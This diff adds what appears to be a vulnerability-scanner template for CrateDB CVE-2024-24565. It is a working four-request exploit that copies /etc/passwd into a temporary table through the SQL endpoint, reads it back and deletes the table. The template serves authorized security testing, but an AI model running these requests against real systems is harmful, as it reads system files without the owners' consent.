@@ -1,0 +1,79 @@
+id: cratedb-sql-anyfile-read
+info:
+  name: CrateDB SQL Arbitrary File Read (CVE-2024-24565)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: CVE-2024-24565,arbitrary-file-read
+  description: |
+    Exploitation of CrateDB SQL arbitrary file read vulnerability by creating a table, copying file contents to the table, retrieving the data, and cleaning up.
+
+variables:
+  table_name: "{{concat('a',rand_base(5))}}"
+
+http:
+  - id: create-table
+    method: POST
+    path:
+      - "{{BaseURL}}/_sql?types"
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: |
+      {"stmt":"CREATE TABLE {{table_name}}({{table_name}} STRING)"}
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: copy-file
+    method: POST
+    path:
+      - "{{BaseURL}}/_sql?types"
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: |
+      {"stmt":"COPY {{table_name}} FROM '/etc/passwd' with (format='csv', header=false)"}
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: select-data
+    method: POST
+    path:
+      - "{{BaseURL}}/_sql?types"
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: |
+      {"stmt":"SELECT * FROM {{table_name}} LIMIT 100"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/bin"
+          - "root:"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+  - id: drop-table
+    method: POST
+    path:
+      - "{{BaseURL}}/_sql?types"
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: |
+      {"stmt":"DROP TABLE {{table_name}}"}
+    matchers:
+      - type: status
+        status:
+          - 200
